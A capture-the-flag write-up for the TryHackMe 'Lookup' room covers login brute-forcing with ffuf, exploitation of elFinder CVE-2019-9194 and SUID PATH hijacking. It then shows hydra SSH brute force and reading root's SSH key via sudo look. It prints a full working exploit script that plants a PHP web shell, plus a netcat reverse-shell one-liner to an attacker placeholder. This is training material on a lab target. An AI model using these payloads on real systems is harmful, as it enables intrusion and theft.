---
title: "Lookup CTF"
image: /room_image.webp
categories: [CTFs ,Tryhackme]
tags: [brute force, ffuf, vhost, path hijacking, suid, ssh, hydra]
media_subpath: /images/lookup-ctf
author: <author_id>
---
The assessment began with **brute-forcing** a login form to obtain valid credentials, granting access to a **virtual host** running `elFinder`. We exploited a **command injection** vulnerability in elFinder to gain a shell. Then, using **PATH hijacking**, we manipulated an **SUID** binary to retrieve a list of passwords. After testing these against the **SSH service**, we obtained additional credentials, gained access as another user, and **leveraged sudo privileges** to read the root SSH key, ultimately achieving root access.

----

## **Enumeration - Nmap Scan**

```console
nmap -sC -sV -Pn -p- -n -T4 10.10.158.110
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-24 14:29 GMT
Nmap scan report for 10.10.158.110
Host is up (0.00021s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
MAC Address: 02:5E:6C:DB:19:57 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
```

### **Open Ports**

| Ports | Services | Version             |
| ----- | -------- | ------------------- |
| 22    | SSH      | OpenSSH 8.2  Ubuntu |
| 80    | http     | Apache httpd 2.4.41 |

## **Overview of services**

```
10.10.158.110   lookup.thm
```
{: file="/etc/hosts"}

### **port 80**

![Desktop View](/port-80.webp){: width="1200" height="450" }

Let's conduct a test using a randomly generated username: `dsgsdgs` and password: `mflspdgk`.

![Desktop View](/error-port-80.webp){: width="1200" height="450" }

Let's perform a test using a common credential pair: username: `admin` and password: `admin`.

![Desktop View](/admin-login-port-80.webp){: width="1200" height="450" }

>This indicates that a brute-forcing technique can be employed to systematically test multiple credential combinations.
{: .prompt-tip}


## foothold

### **Brute Force** 

After attempting a brute force attack on the admin account, no valid password was discovered, suggesting that the account is protected by a strong password.

Let’s proceed with brute-forcing to identify if there are additional usernames present on the system. 

```console
$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' 
-X POST -d 'username=FUZZ&password=test' -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100

...
admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 90ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 132ms]
....

```
1. new username:`jose`

Let’s initiate a brute-force attack to test password combinations for the username `jose`.

```console
$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100000.txt -mc all -ic -fs 62 -t 100
....
....
p********             [Status: 302, Size: 0, Words: 1, Lines: 1]
....
....

```

The password for the username `jose` has been successfully obtained. Let’s proceed to log in as `jose`.

![Desktop View](/add-files-subdom.webp){: width="1200" height="450" }


```
10.10.158.110   lookup.thm  files.lookup.thm
```
{: file="/etc/hosts"}

![Desktop View](/login-jose-files.webp){: width="1200" height="450" }

Great! Let’s move forward and explore what’s available under the files.lookup.thm subdomain.

### **Enumeration of the jose Account**

After enumerating the account, no useful files or information were discovered. However, we identified that the site is utilizing elFinder, which may present potential vulnerabilities to exploit.

![Desktop View](/elfinder-version.webp){: width="1200" height="450" }

After conducting some research on elFinder 2.1.47, we identified a critical vulnerability: **CVE-2019-9194**.

The vulnerability arises from how elFinder allows users to upload images and perform operations like resizing or rotating them. Specifically, the application uses the exiftran program for image rotation, but the vulnerability lies in how **elFinder** improperly handles the execution of this program. This flaw enables an attacker to inject arbitrary commands into the system, potentially leading to remote code execution.

### **Analysis of the Source Code for CVE-2019-9194**


```python
#!/usr/bin/python

'''
# Exploit Title: elFinder <= 2.1.47 - Command Injection vulnerability in the PHP connector.
# Date: 26/02/2019
# Exploit Author: @q3rv0
# Vulnerability reported by: Thomas Chauchefoin
# Google Dork: intitle:"elFinder 2.1.x"
# Vendor Homepage: https://studio-42.github.io/elFinder/
# Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz
# Version: <= 2.1.47
# Tested on: Linux 64bit + Python2.7
# PoC: https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/
# CVE: CVE-2019-9194

# Usage: python exploit.py [URL]

'''

import requests

import json

import sys


payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'


def usage():

    if len(sys.argv) != 2:

        print "Usage: python exploit.py [URL]"

        sys.exit(0)


def upload(url, payload):

    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}

    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}

    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)

    j = json.loads(r.text)

    return j['added'][0]['hash']


def imgRotate(url, hash):

    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))

    return r.text


def shell(url):

    r = requests.get("%s/php/SecSignal.php" % url)

    if r.status_code == 200:

       print "[+] Pwned! :)"

       print "[+] Getting the shell..."

       while 1:

           try:

               input = raw_input("$ ")

               r = requests.get("%s/php/SecSignal.php?c=%s" % (url, input))

               print r.text

           except KeyboardInterrupt:

               sys.exit("\nBye kaker!")

    else:

        print "[*] The site seems not to be vulnerable :("


def main():

    usage()

    url = sys.argv[1]

    print "[*] Uploading the malicious image..."

    hash = upload(url, payload)

    print "[*] Running the payload..."

    imgRotate(url, hash)

    shell(url)


if __name__ == "__main__":

    main()
            
```
**Explaination**

1. Vulnerability Identification: The exploit targets a command injection vulnerability in the elFinder PHP connector, which allows arbitrary command execution.

2. Malicious Payload Upload: A malicious image (SecSignal.jpg) is uploaded via the vulnerable file upload functionality, which contains a hidden PHP shell.

3. Payload Execution: The PHP shell (SecSignal.php) is executed by triggering an image rotation command through the connector, writing the PHP script to the server.

4. Shell Access: The attacker accesses the uploaded PHP shell and sends commands to the server, achieving remote code execution.

5. Interacting with the Shell: The attacker interacts with the server's command line via the PHP shell, executing arbitrary system commands.

**How to use**

1. we need python2 with all library in the source code `requests`,`json`,`sys` 

if any of this library doesn't exist you can use 
```console
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python2 get-pip.py
pip2 install <library_name>
```

1. To exploit the **CVE-2019-9194** vulnerability, you need to craft a picture with a specific filename, SecSignal.jpg, or you can modify the code to use a different name. The key part of the exploitation is ensuring that the file is uploaded and processed by elFinder, triggering the command injection. 

>Any picture
{: .prompt-info}

3. After uploading the malicious image:

   `python2 code_source.py http://files.lookup.thm/elFinder/`


![Desktop View](/after-exe-vul.webp){: width="1200" height="450" }

1. Now, let's obtain the reverse shell. 

```console
curl -s 'http://files.lookup.thm/elFinder/php/SecSignal.php' --get --data-urlencode 'c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_Attacker> PORT >/tmp/f'
```

```console
nc -lvnp <LPORT>
.....

$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ export TERM=xterm
<kup.thm/public_html/elFinder/php$ export TERM=xterm
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ ^Z
....

$ stty raw -echo; fg
[2]  - continued  nc -lvnp 

www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## **Reverse-engineering the SUID Binary**

```console
www-data@lookup:/var/www$ find / -perm -u=s 2>/dev/null
...
/usr/sbin/pwm
...
```

Running it, the binary claims to be running the id command to find the username, then attempts to open the /home/<username>/.passwords file. In our case, it fails because the /home/www-data/.passwords file does not exist.

```console
www-data@lookup:/var/www$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```
But checking the /home/think/, we find that the .passwords file exists there. Therefore, we might be able to use the pwm binary to read this file and discover the password for the think user.

```console
www-data@lookup:/var/www$ ls -la /home/think/
...
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
...
```
First, let’s download the pwm binary so we can reverse engineer it. To do this, we can simply copy it to one of the web application’s directories and download it from the web server.

```console
www-data@lookup:/var/www$ cp /usr/sbin/pwm /var/www/lookup.thm/public_html/pwm

$ wget http://lookup.thm/pwm
```

![Desktop View](/reverse-eng.webp){: width="1200" height="450" }

The application is fairly simple:

- First, it prints the message we saw about running the `id` command.

```c
puts("[!] Running \'id\' command to extract the username and user ID (UID)");
```

- Then, it copies the `"id"` string to the `local_e8` variable and runs it by passing it to the `popen` function.

```c
snprintf(local_e8,100,"id");
pFVar2 = popen(local_e8,"r");
```

- If it fails to run the command, it prints an error message and exits.

```c
if (pFVar2 == (FILE *)0x0) {
perror("[-] Error executing id command\n");
uVar3 = 1;
}
```

- If it was successful, then it tries to extract the username from the output of the `id` command with `uid=%*u(%[^)])` and saves it in the `local_128` parameter. The format `uid=%*u(%[^)])` means it looks for a string starting with `uid=`, followed by an unsigned integer, and then captures everything inside the parentheses, excluding the closing parenthesis. For example, with the output of the `id` command being `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, the `local_128` parameter would be `www-data`. If it can't extract the username, it prints an error message and exits.

```c
iVar1 = __isoc99_fscanf(pFVar2,"uid=%*u(%[^)])",local_128);
if (iVar1 == 1) {
...
}
else {
  perror("[-] Error reading username from id command\n");
  uVar3 = 1;
}
```

- After that, it prints the extracted username, builds the string `/home/<username>/.passwords`, and tries to open it as a file. If it fails, it prints an error message and exits. If it successfully opens the file, it prints the contents of the file character by character.

```c
printf("[!] ID: %s\n",local_128);
pclose(pFVar2);
snprintf(local_78,100,"/home/%s/.passwords",local_128);
pFVar2 = fopen(local_78,"r");
if (pFVar2 == (FILE *)0x0) {
  printf("[-] File /home/%s/.passwords not found\n",local_128);
  uVar3 = 0;
}
else {
  while( true ) {
    iVar1 = fgetc(pFVar2);
    if ((char)iVar1 == -1) break;
    putchar((int)(char)iVar1);
  }
  fclose(pFVar2);
  uVar3 = 0;
}
```
### **Path Hijacking**

The problem with the binary is that it runs the `id` command with a relative path, which allows us to hijack it by manipulating the `PATH` environment variable.

When we run a program without an absolute path, Linux tries to find the path to the executable by utilizing the value of the `PATH` environment variable.

We can see the value of the `PATH` variable as follows:

```console
www-data@lookup:/var/www$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

For instance, when we execute the `id` command, the system checks each directory listed in the `PATH` variable, from left to right, to locate the id executable. Once found, it executes the program.

The key here is that we can modify the `PATH` variable. By doing so, we can place a custom executable named `id`—for example, a bash script that outputs `uid=33(think) gid=33(www-data) groups=33(www-data)`—in a directory such as `/tmp`, and make it universally executable.

```console
www-data@lookup:/tmp$ echo -e '#!/bin/bash\necho "uid=33(think) gid=33(www-data) groups=33(www-data)"' > /tmp/id
www-data@lookup:/tmp$ chmod 777 /tmp/id
```

Next, we can modify the `PATH` variable to put `/tmp` first, before any other directory, as such:

```console
www-data@lookup:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@lookup:/tmp$ export PATH=/tmp:$PATH
www-data@lookup:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

As we can see, now when we run the `id` command, it executes `/tmp/id` instead of `/usr/bin/id`, and we get our modified output:

```console
www-data@lookup:/tmp$ which id
/tmp/id
www-data@lookup:/tmp$ id
uid=33(think) gid=33(www-data) groups=33(www-data)
```

Now, we can run the `/usr/sbin/pwm` binary, and due to the modified `PATH` variable, it will also run `/tmp/id`, get `uid=33(think) gid=33(www-data) groups=33(www-data)` as the output of the `id` command, extract the username as `think`, and then print the contents of the `/home/think/.passwords` file as follows:

```console
www-data@lookup:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
...
jose.2856171
```

### **Brute-forcing the Password**

Now that we have a list of possible passwords for the `think` user, we can use `hydra` to test them against the `SSH` service to see if any of them is valid.

```console
$ hydra -l think -P passwords.txt ssh://lookup.thm
...
[22][ssh] host: lookup.thm   login: think   password: jo[REDACTED]k)
1 of 1 target successfully completed, 1 valid password found
```

Since we discovered a valid password, we can use **SSH** to obtain a shell as the `think` user and read the user flag at `/home/think/user.txt`.

```console
$ ssh think@lookup.thm
...
think@lookup:~$ wc -c user.txt
33 user.txt
```

## **Shell as root**

### **Sudo Privilege**

Checking the `sudo` privileges for the `think` user, we can see that we are able to run the `look` binary as `root`.

```console
think@lookup:~$ sudo -l
[sudo] password for think:
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

The `look` binary is similar to `grep` in a sense that its main purpose is to search for lines in a file beginning with a specified string. If it finds any lines that start with the specified string, it prints them.

We can turn this into **arbitrary file read** by specifying the string to search as an empty string, which means every line in the file will match, and it will print the contents of the whole file. We can also see [this method mentioned here in GTFOBins](https://gtfobins.github.io/gtfobins/look/#suid).

Using this method, we are successful at reading the private **SSH** key for the `root` user as such:

```console
think@lookup:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

We can save this private key in a file, set the correct permissions for it, and then use it with **SSH** to gain a shell as the `root` user. From there, we can read the root flag at `/root/root.txt` and complete the room.

```console
$ chmod 600 id_rsa

$ ssh -i id_rsa root@lookup.thm
...
root@lookup:~# wc -c root.txt
33 root.txt
```
